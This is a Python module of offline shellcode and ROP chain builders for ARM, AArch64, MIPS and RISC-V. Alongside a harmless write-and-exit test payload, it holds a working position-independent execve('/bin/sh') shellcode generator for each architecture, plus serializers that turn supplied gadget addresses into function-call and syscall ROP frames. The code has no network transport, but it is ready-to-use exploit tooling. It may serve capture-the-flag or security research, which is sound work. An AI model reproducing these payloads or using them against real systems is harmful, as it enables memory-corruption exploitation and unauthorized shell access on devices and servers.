"""Offline ARM/AArch64/MIPS/RISC-V shellcode and ROP serializers.

This module intentionally has no process or transport functions.  Every public
builder returns :class:`contract.PayloadBuild`, which tuple-unpacks as
``(payload_bytes, placement_map)``.  Gadget addresses and continuations are
always caller supplied; the documented gadget contracts make the generated
stack frames auditable instead of pretending that one epilogue fits every
compiler.

The position-independent marker shellcodes are also used by the optional
networkless Docker verification suite.  They perform exactly ``write(1, ... )``
followed by ``exit(0)`` and embed no command interpreter.
"""
from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import Mapping, Sequence

try:
    from contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes
except ImportError:  # pragma: no cover - package-style import
    from .contract import BuildError, PayloadBuild, ensure_uint, reject_bad_bytes


MAX_LITERAL = 255


@dataclass(frozen=True)
class Architecture:
    name: str
    bits: int
    endian: str
    instruction_width: int
    write_syscall: int
    exit_syscall: int
    execve_syscall: int
    emulator: str


ARCHITECTURES: Mapping[str, Architecture] = {
    "arm": Architecture("arm", 32, "little", 4, 4, 1, 11, "qemu-arm-static"),
    "armbe": Architecture("armbe", 32, "big", 4, 4, 1, 11, "qemu-armeb-static"),
    "aarch64": Architecture("aarch64", 64, "little", 4, 64, 93, 221, "qemu-aarch64-static"),
    "mips": Architecture("mips", 32, "big", 4, 4004, 4001, 4011, "qemu-mips-static"),
    "mipsel": Architecture("mipsel", 32, "little", 4, 4004, 4001, 4011, "qemu-mipsel-static"),
    "riscv64": Architecture("riscv64", 64, "little", 4, 64, 93, 221, "qemu-riscv64-static"),
}

_ALIASES = {
    "arm32": "arm",
    "armle": "arm",
    "armeb": "armbe",
    "arm64": "aarch64",
    "mips32": "mips",
    "mips32be": "mips",
    "mips32el": "mipsel",
    "riscv": "riscv64",
    "rv64": "riscv64",
}


def architecture(name: str) -> Architecture:
    if not isinstance(name, str):
        raise BuildError("architecture must be text")
    normalized = _ALIASES.get(name.lower().replace("-", ""), name.lower())
    try:
        return ARCHITECTURES[normalized]
    except KeyError as exc:
        choices = ", ".join(ARCHITECTURES)
        raise BuildError(f"unsupported architecture {name!r}; choose {choices}") from exc


def _word_pack(spec: Architecture, value: int) -> bytes:
    ensure_uint(value, spec.bits, name="word")
    prefix = "<" if spec.endian == "little" else ">"
    return struct.pack(prefix + ("Q" if spec.bits == 64 else "I"), value)


def _instruction_pack(spec: Architecture, words: Sequence[int]) -> bytes:
    prefix = "<" if spec.endian == "little" else ">"
    for word in words:
        ensure_uint(word, 32, name="instruction")
    return b"".join(struct.pack(prefix + "I", word) for word in words)


def _arm_mov(register: int, immediate: int) -> int:
    ensure_uint(register, 4, name="ARM register")
    ensure_uint(immediate, 8, name="ARM immediate")
    return 0xE3A00000 | (register << 12) | immediate


def _arm_adr(register: int, delta: int) -> int:
    ensure_uint(register, 4, name="ARM register")
    ensure_uint(delta, 8, name="ARM ADR delta")
    return 0xE28F0000 | (register << 12) | delta


def _a64_mov(register: int, immediate: int) -> int:
    ensure_uint(register, 5, name="AArch64 register")
    ensure_uint(immediate, 16, name="AArch64 immediate")
    return 0xD2800000 | (immediate << 5) | register


def _a64_adr(register: int, delta: int) -> int:
    ensure_uint(register, 5, name="AArch64 register")
    if not -(1 << 20) <= delta < (1 << 20):
        raise BuildError("AArch64 ADR delta is out of range")
    encoded = delta & ((1 << 21) - 1)
    return 0x10000000 | ((encoded & 3) << 29) | (((encoded >> 2) & 0x7FFFF) << 5) | register


def _mips_i(opcode: int, source: int, target: int, immediate: int) -> int:
    ensure_uint(opcode, 6, name="MIPS opcode")
    ensure_uint(source, 5, name="MIPS source register")
    ensure_uint(target, 5, name="MIPS target register")
    if not -(1 << 15) <= immediate < (1 << 16):
        raise BuildError("MIPS immediate is out of range")
    return (opcode << 26) | (source << 21) | (target << 16) | (immediate & 0xFFFF)


def _mips_addiu(target: int, source: int, immediate: int) -> int:
    return _mips_i(0x09, source, target, immediate)


def _rv_i(opcode: int, target: int, funct3: int, source: int, immediate: int) -> int:
    ensure_uint(opcode, 7, name="RISC-V opcode")
    ensure_uint(target, 5, name="RISC-V target register")
    ensure_uint(funct3, 3, name="RISC-V funct3")
    ensure_uint(source, 5, name="RISC-V source register")
    if not -(1 << 11) <= immediate < (1 << 11):
        raise BuildError("RISC-V I-immediate is out of range")
    return ((immediate & 0xFFF) << 20) | (source << 15) | (funct3 << 12) | (target << 7) | opcode


def _rv_addi(target: int, source: int, immediate: int) -> int:
    return _rv_i(0x13, target, 0, source, immediate)


def _literal(value: bytes | bytearray | str, *, label: str, nul_terminate: bool) -> bytes:
    if isinstance(value, str):
        try:
            raw = value.encode("utf-8")
        except UnicodeError as exc:
            raise BuildError(f"{label} is not valid UTF-8") from exc
    elif isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
    else:
        raise BuildError(f"{label} must be bytes or text")
    if not raw or len(raw) > MAX_LITERAL:
        raise BuildError(f"{label} must contain 1..{MAX_LITERAL} bytes")
    if nul_terminate:
        if b"\x00" in raw:
            raise BuildError(f"{label} cannot contain an embedded NUL")
        raw += b"\x00"
    return raw


def build_marker_shellcode(
    arch: str,
    marker: bytes | bytearray | str = b"R5B_MULTIARCH_OK\n",
    *,
    bad_bytes: object = (),
) -> PayloadBuild:
    """Build position-independent ``write(marker); exit(0)`` shellcode.

    This deliberately harmless payload is suitable for an emulator smoke test.
    Marker length is capped so every ISA can use one small immediate.
    """

    spec = architecture(arch)
    literal = _literal(marker, label="marker", nul_terminate=False)
    placements: dict[str, int] = {"entry": 0}
    widths: dict[str, int] = {}

    if spec.name.startswith("arm"):
        # ARM mode: PC at the first instruction reads as entry+8.
        words = [
            _arm_adr(1, 24),
            _arm_mov(0, 1),
            _arm_mov(2, len(literal)),
            _arm_mov(7, spec.write_syscall),
            0xEF000000,
            _arm_mov(0, 0),
            _arm_mov(7, spec.exit_syscall),
            0xEF000000,
        ]
        code = _instruction_pack(spec, words)
        placements.update({"write_syscall": 16, "exit_syscall": 28})
    elif spec.name == "aarch64":
        code_size = 8 * 4
        words = [
            _a64_adr(1, code_size),
            _a64_mov(0, 1),
            _a64_mov(2, len(literal)),
            _a64_mov(8, spec.write_syscall),
            0xD4000001,
            _a64_mov(0, 0),
            _a64_mov(8, spec.exit_syscall),
            0xD4000001,
        ]
        code = _instruction_pack(spec, words)
        placements.update({"write_syscall": 16, "exit_syscall": 28})
    elif spec.name in {"mips", "mipsel"}:
        # bgezal $zero, +1 sets $ra to entry+8; marker is 32 bytes beyond it.
        words = [
            0x04110001,
            0x00000000,
            _mips_addiu(5, 31, 32),
            _mips_addiu(4, 0, 1),
            _mips_addiu(6, 0, len(literal)),
            _mips_addiu(2, 0, spec.write_syscall),
            0x0000000C,
            _mips_addiu(4, 0, 0),
            _mips_addiu(2, 0, spec.exit_syscall),
            0x0000000C,
        ]
        code = _instruction_pack(spec, words)
        placements.update({"write_syscall": 24, "exit_syscall": 36})
    else:  # riscv64
        code_size = 9 * 4
        words = [
            (11 << 7) | 0x17,  # auipc a1, 0
            _rv_addi(11, 11, code_size),
            _rv_addi(10, 0, 1),
            _rv_addi(12, 0, len(literal)),
            _rv_addi(17, 0, spec.write_syscall),
            0x00000073,
            _rv_addi(10, 0, 0),
            _rv_addi(17, 0, spec.exit_syscall),
            0x00000073,
        ]
        code = _instruction_pack(spec, words)
        placements.update({"write_syscall": 20, "exit_syscall": 32})

    placements["marker"] = len(code)
    widths["marker"] = len(literal)
    payload = code + literal
    rejected = reject_bad_bytes(payload, bad_bytes)
    return PayloadBuild(
        payload,
        placements,
        widths,
        architecture=spec.name,
        strategy="write-marker-exit",
        metadata={
            "emulator": spec.emulator,
            "bad_bytes": ",".join(f"{value:02x}" for value in rejected),
            "side_effect": "write stdout then exit",
        },
    )


def build_execve_shellcode(
    arch: str,
    path: bytes | bytearray | str = "/bin/sh",
    *,
    bad_bytes: object = (),
) -> PayloadBuild:
    """Build position-independent ``execve(path, NULL, NULL)`` shellcode."""

    spec = architecture(arch)
    literal = _literal(path, label="path", nul_terminate=True)
    placements: dict[str, int] = {"entry": 0}

    if spec.name.startswith("arm"):
        # Six ARM instructions; PC reads as entry+8, literal starts at +24.
        words = [
            _arm_adr(0, 16),
            _arm_mov(1, 0),
            _arm_mov(2, 0),
            _arm_mov(7, spec.execve_syscall),
            0xEF000000,
            0xE7F001F0,  # architected undefined instruction if execve returns
        ]
        code = _instruction_pack(spec, words)
        placements["execve_syscall"] = 16
    elif spec.name == "aarch64":
        code_size = 6 * 4
        words = [
            _a64_adr(0, code_size),
            _a64_mov(1, 0),
            _a64_mov(2, 0),
            _a64_mov(8, spec.execve_syscall),
            0xD4000001,
            0xD4200000,  # brk #0 if execve returns
        ]
        code = _instruction_pack(spec, words)
        placements["execve_syscall"] = 16
    elif spec.name in {"mips", "mipsel"}:
        words = [
            0x04110001,
            0x00000000,
            _mips_addiu(4, 31, 24),
            _mips_addiu(5, 0, 0),
            _mips_addiu(6, 0, 0),
            _mips_addiu(2, 0, spec.execve_syscall),
            0x0000000C,
            0x0000000D,
        ]
        code = _instruction_pack(spec, words)
        placements["execve_syscall"] = 24
    else:
        code_size = 7 * 4
        words = [
            (10 << 7) | 0x17,  # auipc a0, 0
            _rv_addi(10, 10, code_size),
            _rv_addi(11, 0, 0),
            _rv_addi(12, 0, 0),
            _rv_addi(17, 0, spec.execve_syscall),
            0x00000073,
            0x00100073,  # ebreak if execve returns
        ]
        code = _instruction_pack(spec, words)
        placements["execve_syscall"] = 20

    placements["path"] = len(code)
    payload = code + literal
    rejected = reject_bad_bytes(payload, bad_bytes)
    return PayloadBuild(
        payload,
        placements,
        {"path": len(literal)},
        architecture=spec.name,
        strategy="position-independent-execve",
        metadata={
            "syscall": str(spec.execve_syscall),
            "bad_bytes": ",".join(f"{value:02x}" for value in rejected),
            "delivery": "none",
        },
    )


_CALL_CONTRACTS: Mapping[str, tuple[tuple[str, ...], tuple[str, ...], str]] = {
    "arm": (("r0", "r1", "r2", "r3"), ("r12", "lr", "pc"),
            "loader pops r0-r3,r12,lr,pc; pc=target and lr=continuation"),
    "armbe": (("r0", "r1", "r2", "r3"), ("r12", "lr", "pc"),
              "loader pops r0-r3,r12,lr,pc; pc=target and lr=continuation"),
    "aarch64": (("x0", "x1", "x2", "x3", "x4", "x5", "x6", "x7"),
                ("x16", "x30"),
                "loader restores x0-x7,x16,x30 then br x16; x30=continuation"),
    "mips": (("a0", "a1", "a2", "a3"), ("t9", "ra"),
             "loader restores a0-a3,t9,ra then jalr t9"),
    "mipsel": (("a0", "a1", "a2", "a3"), ("t9", "ra"),
               "loader restores a0-a3,t9,ra then jalr t9"),
    "riscv64": (("a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7"),
                ("t0", "ra"),
                "loader restores a0-a7,t0,ra then jalr t0"),
}


def _serialize_frame(
    spec: Architecture,
    loader_gadget: int,
    fields: Sequence[tuple[str, int]],
    *,
    stack_base: int,
    strategy: str,
    metadata: Mapping[str, str],
) -> PayloadBuild:
    ensure_uint(loader_gadget, spec.bits, name="loader_gadget")
    ensure_uint(stack_base, spec.bits, name="stack_base")
    word_size = spec.bits // 8
    payload = bytearray(_word_pack(spec, loader_gadget))
    placements = {"loader_gadget": 0}
    widths = {"loader_gadget": word_size}
    for label, value in fields:
        ensure_uint(value, spec.bits, name=label)
        placements[label] = len(payload)
        widths[label] = word_size
        payload.extend(_word_pack(spec, value))
    return PayloadBuild(
        bytes(payload),
        placements,
        widths,
        architecture=spec.name,
        strategy=strategy,
        base_address=stack_base,
        metadata=metadata,
    )


def build_call_rop(
    arch: str,
    *,
    loader_gadget: int,
    function: int,
    arguments: Sequence[int] = (),
    continuation: int = 0,
    scratch: int = 0,
    stack_base: int = 0,
) -> PayloadBuild:
    """Serialize a parameterized function-call frame for a documented gadget.

    The caller supplies the one loader/call gadget matching ``gadget_contract``
    in the result metadata.  Missing argument registers are filled with zero.
    """

    spec = architecture(arch)
    arg_registers, tail_registers, contract = _CALL_CONTRACTS[spec.name]
    if isinstance(arguments, (bytes, bytearray, str)):
        raise BuildError("arguments must be a sequence of integers")
    try:
        values = tuple(arguments)
    except TypeError as exc:
        raise BuildError("arguments must be a sequence of integers") from exc
    if len(values) > len(arg_registers):
        raise BuildError(f"{spec.name} call frame supports at most {len(arg_registers)} arguments")
    fields = [(register, values[index] if index < len(values) else 0)
              for index, register in enumerate(arg_registers)]
    if spec.name.startswith("arm"):
        fields.extend(((tail_registers[0], scratch), (tail_registers[1], continuation),
                       (tail_registers[2], function)))
    else:
        fields.extend(((tail_registers[0], function), (tail_registers[1], continuation)))
    return _serialize_frame(
        spec,
        loader_gadget,
        fields,
        stack_base=stack_base,
        strategy="multiarch-function-call-rop",
        metadata={"gadget_contract": contract, "delivery": "none"},
    )


_SYSCALL_CONTRACTS: Mapping[str, tuple[tuple[str, ...], str, tuple[str, ...], str]] = {
    "arm": (("r0", "r1", "r2", "r3", "r4", "r5", "r6"), "r7", ("lr", "pc"),
            "loader pops r0-r7,lr,pc; syscall gadget is svc 0; bx lr"),
    "armbe": (("r0", "r1", "r2", "r3", "r4", "r5", "r6"), "r7", ("lr", "pc"),
              "loader pops r0-r7,lr,pc; syscall gadget is svc 0; bx lr"),
    "aarch64": (("x0", "x1", "x2", "x3", "x4", "x5"), "x8", ("x16", "x30"),
                "loader restores x0-x5,x8,x16,x30 then br x16; gadget is svc 0; ret"),
    "mips": (("a0", "a1", "a2", "a3"), "v0", ("t9", "ra"),
             "loader restores a0-a3,v0,t9,ra then jr t9; gadget is syscall; jr ra"),
    "mipsel": (("a0", "a1", "a2", "a3"), "v0", ("t9", "ra"),
               "loader restores a0-a3,v0,t9,ra then jr t9; gadget is syscall; jr ra"),
    "riscv64": (("a0", "a1", "a2", "a3", "a4", "a5"), "a7", ("t0", "ra"),
                "loader restores a0-a5,a7,t0,ra then jr t0; gadget is ecall; ret"),
}


def build_syscall_rop(
    arch: str,
    *,
    loader_gadget: int,
    syscall_gadget: int,
    syscall_number: int,
    arguments: Sequence[int] = (),
    continuation: int = 0,
    stack_base: int = 0,
) -> PayloadBuild:
    """Serialize a syscall ROP frame with explicit per-ISA gadget semantics."""

    spec = architecture(arch)
    arg_registers, number_register, control_registers, contract = _SYSCALL_CONTRACTS[spec.name]
    if isinstance(arguments, (bytes, bytearray, str)):
        raise BuildError("arguments must be a sequence of integers")
    try:
        values = tuple(arguments)
    except TypeError as exc:
        raise BuildError("arguments must be a sequence of integers") from exc
    if len(values) > len(arg_registers):
        raise BuildError(f"{spec.name} syscall frame supports at most {len(arg_registers)} arguments")
    fields = [(register, values[index] if index < len(values) else 0)
              for index, register in enumerate(arg_registers)]
    fields.append((number_register, syscall_number))
    if spec.name.startswith("arm"):
        fields.extend(((control_registers[0], continuation),
                       (control_registers[1], syscall_gadget)))
    else:
        fields.extend(((control_registers[0], syscall_gadget),
                       (control_registers[1], continuation)))
    return _serialize_frame(
        spec,
        loader_gadget,
        fields,
        stack_base=stack_base,
        strategy="multiarch-syscall-rop",
        metadata={"gadget_contract": contract, "delivery": "none"},
    )


def available_builders() -> Mapping[str, tuple[str, ...]]:
    """Machine-readable coverage inventory for triage/reporting."""

    return {
        name: ("marker_shellcode", "execve_shellcode", "call_rop", "syscall_rop")
        for name in ARCHITECTURES
    }
